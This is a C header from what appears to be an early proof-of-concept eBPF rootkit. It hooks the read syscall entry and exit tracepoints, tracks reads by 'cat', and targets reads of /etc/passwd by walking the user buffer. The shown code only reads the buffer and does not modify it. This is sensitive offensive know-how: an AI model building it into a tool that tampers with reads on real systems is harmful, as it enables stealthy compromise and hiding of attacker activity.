/**
 * POC : trying to hook read returns based on dedicated files.
 * 
 * @author Yekuuun
 */

#ifndef MOD_HOOK_READ_H
#define MOD_HOOK_READ_H

#include "../includes/bpf_config.h"
#include "../includes/bpf_common.h"
#include "../includes/bpf_structs.h"
#include "../includes/bpf_debug.h"
#include "../includes/bpf_events_handler.h"
#include "../data/bpf_events.h"
#include "../data/bpf_ringbuf.h"
#include "../lib/ftlib.h"

typedef struct read_loop_ctx {
    unsigned long read;
    char *ubuff;
    __u32 count;
} read_loop_ctx;

/**
 * Main callback called by bpf_loop() when iterating througt the __user *buffer
 */
static long __read_user_buffer(__u32 index, void *data)
{
    struct read_loop_ctx *lctx = (struct read_loop_ctx*)data;
    if(!lctx)
        return 1;

    if(lctx->read >= lctx->count){
        PRINT_DEBUG("End of buff read.");
        return 1;
    }

    char buff[BUFF_READ] = {0};
    if(bpf_probe_read_user(buff, sizeof(buff), lctx->ubuff) < 0){
        PRINT_DEBUG("Error reading buffer");
        return 1;
    }

    //PRINT_DEBUG("  Current read : %ld", lctx->read);

    lctx->read += BUFF_READ;
    return 0;
}

/**
 * Hook sys_enter_read.
 */
SEC("tp/syscalls/sys_enter_read")
int tp_sys_enter_read(struct sys_enter_read_ctx *ctx)
{
    if(!ctx)
        return 0;

    if(!__is_target_bin() || !__is_binary_cat())
        return 0;

    __u64 fd    = ctx->fd; 
    __u32 count = ctx->count;
    char *ubuff = ctx->buf;

    __u64 pid_tgid = bpf_get_current_pid_tgid(); //64 bits value returned.

    /**
     * key to retrieve correct openat "cat" call stored in previous sys_openat call. see mod_hook_open.h
     */
    struct fd_key key = {
        .fd = fd,
        .pid_tgid = pid_tgid
    };

    //build value.
    struct sys_enter_cached_val val = {
        .count = count,
        .fd    = fd,
        .ubuff_adr = ubuff
    };

    char* target = bpf_map_lookup_elem(&fd_to_path_cache, &key);
    if(!target)
        return 0;

    if(bpf_probe_read_kernel_str(&val.path, MAX_PATH, target) < 0){
        PRINT_DEBUG("Error retrieving value from map cache.");
        return 0;
    }

    PRINT_DEBUG("  Found call for filepath : %s. Storing cache value for exit...", val.path);
    bpf_map_update_elem(&read_cache, &pid_tgid, &val, BPF_ANY);

    //clean.
    return 0;
}

/**
 * Hook sys_exit_read.
 */
SEC("tp/syscalls/sys_exit_read")
int tp_sys_exit_read(struct sys_exit_read_ctx *ctx)
{
    if(!ctx)
        return 0;

    if(!__is_target_bin() || !__is_binary_cat())
        return 0;

    __u64 pid_tgid = bpf_get_current_pid_tgid(); //64 bits value returned.

    __u64 *val = bpf_map_lookup_elem(&read_cache, &pid_tgid);
    if(!val)
        return 0; //silence.

    //convert to valid ptr.
    struct sys_enter_cached_val *cache = bpf_map_lookup_elem(&read_cache, &pid_tgid);
    if(!cache)
        return 0; //silence.

    __u64 fd    = cache->fd;
    __u32 count = cache->count;

    PRINT_DEBUG("   Entry of sys_exit_read => resolved fd => %ld", fd);

    //only keep passwd for testing.
    if(ft_strstr(cache->path, "passwd") == NULL){
        PRINT_DEBUG("   NOT /etc/passwd ???? WHUUUUUUUUUUUT");
        goto __END;
    }

    struct read_loop_ctx lctx = {
        .count = cache->count,
        .read  = 0,
        .ubuff = cache->ubuff_adr
    };

    long nr_completed = bpf_loop(MAX_ITER_LOOP, __read_user_buffer, &lctx, 0);

__END: 
    PRINT_DEBUG("   Cleaning maps...");
    bpf_map_delete_elem(&read_cache, &pid_tgid);

    return 0;
}

#endif